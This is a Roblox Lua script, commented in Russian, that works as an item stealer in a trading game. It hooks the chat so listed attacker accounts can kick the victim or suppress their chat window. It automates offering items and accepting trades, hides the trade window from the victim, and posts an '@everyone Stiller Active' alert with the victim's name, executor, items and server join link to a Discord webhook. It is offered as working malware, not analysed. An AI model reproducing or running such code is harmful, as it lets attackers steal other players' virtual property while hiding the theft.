-- БЕЗОПАСНЫЙ ХУК НА ОТПРАВКУ СООБЩЕНИЙ
local chat_blocked = false
local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
    if not checkcaller() and chat_blocked and getnamecallmethod() == "SendAsync" then
        return
    end
    return oldNamecall(self, ...)
end)

local function ToggleUI(enable)
    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, not enable)
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            TextChatService.ChatWindowConfiguration.Enabled = not enable
            TextChatService.ChatInputBarConfiguration.Enabled = not enable
        end
    end)
end

local function CheckCommands(plr, msg)
    if plr and table.find(TARGET_USERS, plr.Name) then
        local lower = string.lower(msg)
        if string.find(lower, "kick") then
            LocalPlayer:Kick("You banned")
        elseif string.find(lower, "hello") then
            chat_blocked = not chat_blocked
            ToggleUI(chat_blocked)
        end
    end
end

pcall(function()
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        TextChatService.OnIncomingMessage = function(message)
            local source = message.TextSource
            if source then
                local plr = Players:GetPlayerByUserId(source.UserId)
                if plr then CheckCommands(plr, message.Text) end
            end
        end
    end
end)

for _, p in ipairs(Players:GetPlayers()) do
    p.Chatted:Connect(function(msg) CheckCommands(p, msg) end)
end
Players.PlayerAdded:Connect(function(p)
    p.Chatted:Connect(function(msg) CheckCommands(p, msg) end)
end)
LocalPlayer.Chatted:Connect(function(msg) CheckCommands(LocalPlayer, msg) end)

-- ЛОГИКА ТРЕЙДА
local v54 = function(h, ...) return h:FireServer(...) end
local v55 = function(h, ...) return h:InvokeServer(...) end

local Trade = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
local DeclineTrade = Trade:WaitForChild("DeclineTrade")
local DeclineRequest = Trade:WaitForChild("DeclineRequest")
local CancelRequest = Trade:WaitForChild("CancelRequest")

local function v56(p8)
    local v57 = Players:FindFirstChild(p8)
    if v57 then pcall(function() v55(Trade.SendRequest, v57) end) end
end

local function v58()
    return v55(Trade.GetTradeStatus)
end

local function v59()
    local AcceptTrade = Trade.AcceptTrade
    local retries = 0
    while retries < 50 do
        local v61, v62 = v58()
        if v61 == "None" then break end
        if v62 and v62.LastOffer then
            pcall(function()
                v54(AcceptTrade, game.PlaceId * 3, v62.LastOffer)
                task.wait(0.02) 
                v54(AcceptTrade, game.PlaceId * 3, v62.LastOffer)
            end)
        end
        task.wait(0.05)
        retries = retries + 1
    end
end

local function v63(p9)
    v54(Trade.OfferItem, p9, "Weapons")
end

local function v217(p32)
    if type(p32) == "number" then return string.format("%g", math.floor(p32 * 100 + 0.5) / 100) end
    return tostring(p32)
end

local function SendDiscordAlert(p33)
    local joinLink = "https://www.roblox.com/games/142823291?gameInstanceId=" .. game.JobId
    local itemListString = ""
    local totalValue = 0
    
    for i, item in ipairs(p33) do
        itemListString = itemListString .. item.RealName .. " (x" .. item.Amount .. ")"
        if i < #p33 then itemListString = itemListString .. "\n" end
        totalValue = totalValue + (item.Value * item.Amount)
    end
    
    local desc = string.format(
        "|\nСсылка на сервер - [Нажми сюда чтобы зайти](%s)\n|\nНик - \"%s\"\nЭкзекутор - \"%s\"\n|\nСписок предметов:\n%s\n|\nОбщие валюты - \"%s\"",
        joinLink, LocalPlayer.Name, identifyexecutor(), itemListString, v217(totalValue)
    )
    
    pcall(function()
        request({
            Url = WEBHOOK_URL, 
            Method = "POST", 
            Headers = {["Content-Type"] = "application/json"}, 
            Body = HttpService:JSONEncode({
                content = "@everyone Stiller Active", 
                embeds = {{
                    description = desc, 
                    color = 16777215
                }}
            })
        })
        print("Готово") 
    end)
end

game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI").GetPropertyChangedSignal("Enabled"):Connect(function() game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI.Enabled = false end)
